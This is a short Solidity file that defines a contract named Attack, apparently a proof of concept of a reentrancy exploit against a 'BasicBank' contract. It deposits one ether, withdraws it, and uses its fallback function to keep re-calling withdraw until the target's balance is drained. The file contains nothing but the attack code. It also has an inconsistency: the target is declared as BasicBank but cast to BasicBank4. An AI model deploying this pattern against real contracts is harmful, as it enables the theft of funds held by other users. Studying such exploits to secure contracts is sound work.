//SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import './BasicBank.sol';

contract Attack{
    BasicBank public target;
    constructor(address payable _target){
        target = BasicBank4(_target);
    }
    function attack() external payable{
        require(msg.value >= 1e18, "At least 1 ether");
        target.deposit{value: 1e18}();
        target.withdraw(1e18);
    }
    fallback()external payable{
        if(address(target).balance >= 1e18){
            target.withdraw(1e18);
        }
    }
}